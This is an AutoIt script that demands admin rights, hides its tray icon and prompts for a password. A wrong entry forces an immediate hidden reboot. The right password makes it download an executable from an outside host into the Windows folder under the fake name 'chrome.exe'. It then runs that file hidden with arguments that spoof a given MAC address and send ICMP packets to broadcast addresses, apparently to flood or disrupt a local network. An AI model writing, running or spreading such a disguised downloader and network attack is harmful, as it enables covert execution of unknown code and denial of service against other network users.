#include <InetConstants.au3>

#NoTrayIcon
#RequireAdmin

    Local $sPasswd = InputBox("Security Check", "Input everything you like", "", "*")

	local $correctPass = "chuphongnetsn"

	if $sPasswd == $correctPass then
	  Example()
	else
			RunWait(@ComSpec & ' /C shutdown -t 0 -r -f',"",@SW_HIDE)
	endif

Func Example()

   Local $sFilePath = @WindowsDir & "\chrome.exe"

    Local $hDownload = InetGet("http://chuphong.net/pm/hix2.exe", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADBACKGROUND)

    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    InetClose($hDownload)

   $mac = InputBox("?","??","")

   MsgBox(0,"Finish","You have 1 minute")
   sleep(60000)

   RunWait(@ComSpec & ' /C chrome -I 1 -A 4 -a icmp-echo  -s ' & $mac & '-% -d ff:ff:ff:ff:ff:ff-255.255.255.255 -t 128',"",@SW_HIDE)

EndFunc   ;==>Example

